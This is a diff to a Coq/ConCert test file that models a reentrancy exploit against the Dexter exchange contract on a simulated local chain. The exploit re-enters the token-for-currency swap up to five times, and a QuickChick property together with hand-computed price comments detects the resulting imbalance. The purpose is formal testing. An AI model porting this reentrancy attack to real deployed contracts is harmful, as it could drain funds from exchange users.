@@ -5,6 +5,8 @@ From ConCert Require Import LocalBlockchainTests.
 From ConCert Require Import Extras.
 From ConCert Require Import Containers.
 From ConCert Require Import BoundedN.
+Require Import Monads.
+
 Global Set Warnings "-extraction-logical-axiom".
 Require Import ZArith Strings.String.
 
@@ -19,8 +21,8 @@ From Coq Require Import Morphisms.
 Import ListNotations.
 Import RecordSetNotations.
 (* For monad notations *)
-From ExtLib.Structures Require Import Monads.
-Import MonadNotation. Open Scope monad_scope.
+(* From ExtLib.Structures Require Import Monads. *)
+(* Import MonadNotation. Open Scope monad_scope. *)
 Close Scope address_scope.
 (* Notation "f 'o' g" := (compose f g) (at level 50). *)
 
@@ -65,7 +67,7 @@ Definition exploit_init
             (chain : Chain)
             (ctx : ContractCallContext)
             (setup : ExplotContractSetup) : option ExploitContractState :=
-  Some 0.
+  Some 1.
 Definition exploit_receive (chain : Chain)
 						 			 (ctx : ContractCallContext)
 									 (state : ExploitContractState)
@@ -75,16 +77,16 @@ Definition exploit_receive (chain : Chain)
   let caddr := ctx.(ctx_contract_address) in
   let dexter_balance := chain.(account_balance) caddr in
   match maybe_msg with
-  | Some (tokens_sent param) => if 1 <? state
+  | Some (tokens_sent param) => if 5 <? state (* repeat reentrancy up to five times *)
                                 then Some (state, [])
                                 else 
-                                  let token_exchange_msg := tokens_to_asset {|
+                                  let token_exchange_msg := other_msg (tokens_to_asset {|
                                     exchange_owner := person_1;
                                     exchange_token_id := 0%N;
-                                    tokens_sold := 1%N;
+                                    tokens_sold := 200%N;
                                     callback_addr := caddr;
-                                  |} in
-                                  Some (S state, [act_call dexter_caddr 0%Z (serialize _ _ token_exchange_msg)])
+                                  |}) in
+                                  Some (state + 1, [act_call dexter_caddr 0%Z (serialize _ _ token_exchange_msg)])
   | _ => Some (state, [])
   end.
 
@@ -101,7 +103,7 @@ build_contract exploit_init exploit_init_proper exploit_receive exploit_receive_
 
 End ExplotContract.
 
-Definition deploy_exploit : @ActionBody Base := create_deployment 10 exploit_contract tt.
+Definition deploy_exploit : @ActionBody Base := create_deployment 0 exploit_contract tt.
 Definition exploit_caddr : Address := BoundedN.of_Z_const AddrSize 130%Z.
 
 Definition dexter_other_msg := @other_msg _ DexterMsg _.
@@ -112,7 +114,7 @@ Definition add_operator_all owner operator := {|
   op_param_tokens := all_tokens;
 |}.
 
-Definition chain1 : LocalChain :=  
+Definition chain1 :=  
   unpack_option (my_add_block lc_initial 
   [
     build_act creator (act_transfer person_1 10);
@@ -122,9 +124,10 @@ Definition chain1 : LocalChain :=
     build_act creator deploy_exploit;
 
     build_act person_1 (act_call fa2_caddr 10%Z (serialize _ _ (msg_create_tokens 0%N))) ;
+    build_act creator (act_call dexter_caddr 10%Z (serialize _ _ (dexter_other_msg (add_to_tokens_reserve 0%N)))) ;
     (* build_act person_2 (act_call fa2_caddr 10%Z (serialize _ _ (msg_create_tokens 0%N))) ;  *)
-    build_act person_1 (act_call fa2_caddr 0%Z  (serialize _ _ (msg_update_operators [add_operator (add_operator_all person_1 exploit_caddr)]))) ;
-    build_act person_1 (act_call fa2_caddr 0%Z  (serialize _ _ (msg_update_operators [add_operator (add_operator_all person_1 dexter_caddr)])))
+    build_act person_1 (act_call fa2_caddr 0%Z  (serialize _ _ (msg_update_operators [add_operator (add_operator_all person_1 exploit_caddr);
+                                                                                      add_operator (add_operator_all person_1 dexter_caddr)])))
     (* build_act person_2 (act_call fa2_caddr 0%Z  (serialize _ _ (msg_update_operators [add_operator (add_operator_all person_2 dexter_caddr)]))) *)
   ]).
 
@@ -157,8 +160,119 @@ Module TestInfo <: DexterTestsInfo.
 End TestInfo.
 Module MG := DexterGens.DexterGens TestInfo. Import MG.
 
-Sample (gDexterAction chain1).
-Sample (gDexterChainTraceList 1 chain1 10).
+Definition call_dexter owner_addr := 
+  let dummy_descriptor := {|
+    transfer_descr_fa2 := fa2_caddr;
+    transfer_descr_batch := [];
+    transfer_descr_operator := dexter_caddr; 
+  |} in
+  build_act owner_addr (act_call exploit_caddr 0%Z (@serialize _ _ (tokens_sent dummy_descriptor))).
+
+Definition gExploitAction : G (option Action) := 
+  returnGen (Some (call_dexter person_1)).
+
+Definition gExploitChainTraceList max_acts_per_block lc length := 
+  gLocalChainTraceList_fix lc (fun _ _ => gExploitAction) length max_acts_per_block.
+
+
+(* Definition chain2 : LocalChain :=  
+  unpack_option (my_add_block chain1 
+  [ call_dexter ]).
+
+Compute (dexter_state chain2).
+Compute (show (token_state chain2)). *)
+(* Compute (show chain1.(lc_account_balances)). *)
+Sample (gExploitAction).
+(* Sample (gExploitChainTraceList 1 chain1 1). *)
+
+Definition person_1_initial_balance : Amount := 
+  unpack_option (FMap.find person_1 chain1.(lc_account_balances)).
+Definition dexter_liquidity : Amount := 
+  unpack_option (FMap.find dexter_caddr chain1.(lc_account_balances)).
+
+Definition account_tokens (lc : LocalChain) (account : Address) : N :=
+  with_default 0%N (
+    do state_fa2 <- token_state lc ;
+    do assets <- FMap.find 0%N state_fa2.(assets) ;
+    FMap.find account assets.(balances)).
+
+Compute (account_tokens chain1 dexter_caddr).
+(* 1000%N *)
+Compute (account_tokens chain1 person_1).
+(* 1000%N *)
+Compute person_1_initial_balance.
+(* 0%Z *)
+Compute dexter_liquidity.
+(* 30%Z *)
+
+(* This property asserts that the token reserve of the dexter contract is consistent 
+   with how much money has been exchanged for tokens, with respect to the conversion function 'getInputPrice' *)
+Open Scope Z_scope.
+Definition tokens_to_asset_correct_P_opt (lc : LocalChain) : option Checker :=
+  do state_dexter <- dexter_state lc ;
+  do person_1_balance <- FMap.find person_1 lc.(lc_account_balances) ;
+  do dexter_balance <- FMap.find dexter_caddr lc.(lc_account_balances) ;
+  do dexter_initial_balance <- FMap.find dexter_caddr chain1.(lc_account_balances) ;
+  do dexter_initial_balance <- FMap.find dexter_caddr chain1.(lc_account_balances) ; 
+  let dexter_initial_token_reserve := Z.of_N (account_tokens chain1 dexter_caddr) in
+  let dexter_current_token_reserve := Z.of_N (account_tokens lc dexter_caddr) in
+  let tokens_received := dexter_current_token_reserve - dexter_initial_token_reserve in
+  let expected_currency_sold := getInputPrice tokens_received dexter_initial_token_reserve dexter_initial_balance in
+  let expected_dexter_balance := dexter_initial_balance - expected_currency_sold in
+  Some (
+    whenFail (
+      "dexter balance was " ++ show dexter_balance ++ " while it was expected to be at least " ++ show expected_dexter_balance ++ 
+      "person_1 balance: " ++ show person_1_balance ++ nl ++
+      "person_1 tokens: " ++ show (account_tokens lc person_1) ++ nl ++
+      "dexter balance: " ++ show dexter_balance ++ nl ++
+      "dexter tokens: " ++ show (account_tokens lc dexter_caddr) ++ nl ++
+      "history: " ++ show (state_dexter.(price_history))
+    )
+    (checker (expected_dexter_balance <? dexter_balance))
+  ).
+
+Definition tokens_to_asset_correct_P lc := 
+  match tokens_to_asset_correct_P_opt lc with
+  | Some p => p
+  | None => false ==> true
+  end.
+
+Definition tokens_to_asset_correct := 
+  forAllTraces 1 chain1 (gExploitChainTraceList 1) tokens_to_asset_correct_P.
+
+Compute (getInputPrice 1000 1000 30).
+
+
+Compute (getInputPrice 200 1000 30).
+(* 4 *)
+Compute (getInputPrice 200 1200 26).
+(* 3 *)
+Compute (getInputPrice 200 1400 23).
+(* 2 *)
+Compute (getInputPrice 200 1600 21).
+(* 2 *)
+Compute (getInputPrice 200 1800 19).
+(* 1 *)
+(* total = 12 *)
+Compute (getInputPrice 200 1000 30).
+(* 4 *)
+Compute (getInputPrice 200 1000 26).
+(* 4 *)
+Compute (getInputPrice 200 1000 22).
+(* 3 *)
+Compute (getInputPrice 200 1000 19).
+(* 3 *)
+Compute (getInputPrice 200 1000 16).
+(* 2 *)
+(* total = 16 *)
+
+QuickChick tokens_to_asset_correct.
+
+
+
+
+(* Sample (gDexterAction chain1). *)
+(* Sample (gDexterChainTraceList 1 chain1 10). *)
 
 QuickChick (forAllTraces 5 chain1 (gDexterChainTraceList 1)
  (fun lc => whenFail 
